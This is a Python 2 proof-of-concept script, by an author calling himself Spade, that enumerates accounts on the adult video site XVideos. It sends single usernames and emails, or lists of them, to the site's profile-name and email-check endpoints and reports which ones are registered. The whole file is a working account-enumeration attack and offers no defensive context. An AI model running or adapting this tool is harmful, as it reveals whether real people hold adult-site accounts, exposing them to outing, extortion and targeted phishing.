#!/usr/bin/python
#
# My First Python Script :D
#	By Spade
# Email and Username enum PoC Script Private
#
# This is my first Python Script which is very Successful :D
# 

from sys import argv
import urllib
import argparse
import os.path

class bc:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

spade = '''
+------------------------------------------------------+
|    XVIDEOS Email and User Enumeration PoC Script     |
|                   By: Spade 	 		       |
+------------------------------------------------------+ '''

parser = argparse.ArgumentParser(description='')
parser.add_argument('-u', '--username', help='Check XVideos Username')
parser.add_argument('-U', '--userLists', help='Check XVideos Username from List')
parser.add_argument('-e', '--email', help='Check XVideos Email')
parser.add_argument('-E', '--emailLists', help='Check XVideos Email from List')
args = parser.parse_args()

if __name__ == '__main__':
	print spade+"\n"

	if args.username:
		links = "https://upload.xvideos.com/account/checkprofilename?profile="+args.username
		if urllib.urlopen(links).getcode() == 200:
			site = urllib.urlopen(links).read()
			if "The profile name &#039;"+args.username+"&#039; already exists." in site:
				print bc.BOLD+"User Exist."+bc.ENDC
				print bc.OKBLUE+"Profile Link: https://www.xvideos.com/profiles/"+args.username+"#_tabAboutMe"+bc.ENDC
			else:
				print bc.WARNING+"User Not Exist."+bc.ENDC
		else:
			print bc.FAIL+"Error"+bc.ENDC
			exit(2)

	elif args.userLists:
		if os.path.isfile(args.userLists) == True:
			userList = open(args.userLists, "r")
		else:
			print bc.FAIL+"User List Not Found"+bc.ENDC
			exit(2)		
		for userlist in userList:
			linkx = "https://upload.xvideos.com/account/checkprofilename?profile="+userlist
			if urllib.urlopen(linkx).getcode() == 200:
				site = urllib.urlopen(linkx).read()
				if "already exists." in site:
					print bc.BOLD+"[+] User Exist ==> %s" %userlist +bc.ENDC 
					print bc.OKBLUE+"Profile Link: https://www.xvideos.com/profiles/%s" %userlist +bc.ENDC
				else:
					print bc.FAIL+"[X] User Not Exist ==> %s" %userlist +bc.ENDC
			else:
				print bc.FAIL+"Error"+bc.ENDC
				exit(2)

	elif args.email:
		linkz = "https://upload.xvideos.com/account/checkemail?email="+args.email
		if urllib.urlopen(linkz).getcode() == 200:
			site = urllib.urlopen(linkz).read()
			if "This email is invalid." in site:
				print bc.BOLD+"Email Exist."+bc.ENDC
			elif "Invalid email address." in site:
				print bc.WARNING+"Invalid Email."+bc.ENDC
			else:
				print bc.FAIL+"Email Not Exist."+bc.ENDC
		else:
			print bc.FAIL+"Error"+bc.ENDC
			exit(2)

	elif args.emailLists:
		if os.path.isfile(args.emailLists) == True:
			emailList = open(args.emailLists, "r")
		else:
			print bc.FAIL+"Email List Not Found"+bc.ENDC
			exit(2)
		for list in emailList:
			link = "https://upload.xvideos.com/account/checkemail?email="+list 

			if urllib.urlopen(link).getcode() == 200:
				site = urllib.urlopen(link).read()
				if "This email is invalid." in site:
					print bc.BOLD+"[+] Email Exist ==> %s" % list+bc.ENDC
				elif "Invalid email address." in site:
					print bc.WARNING+"[!] Invalid Email ==> %s" %list +bc.ENDC
				else:
					print bc.FAIL+"[X] Email Not Exist ==> %s" % list+bc.ENDC
			else:
				print bc.FAIL+"Error"+bc.ENDC
				exit(2)

	else:
		print bc.FAIL+"Invalid Argument"+bc.ENDC
		print "See -h options or --help for more info."
